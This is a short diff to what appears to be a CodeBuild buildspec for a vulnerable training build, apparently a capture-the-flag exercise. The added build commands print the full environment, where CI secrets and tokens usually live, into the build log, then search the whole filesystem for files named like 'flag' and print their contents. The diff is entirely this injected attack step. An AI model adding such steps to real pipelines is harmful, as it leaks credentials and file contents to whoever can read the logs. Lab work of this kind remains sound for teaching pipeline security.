@@ -1,8 +1,8 @@
 version: 0.2
-
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "Checking environment..."
+      - env
+      - echo "Searching for the flag..."
+      - find / -name "*flag*" 2>/dev/null -exec cat {} + || true
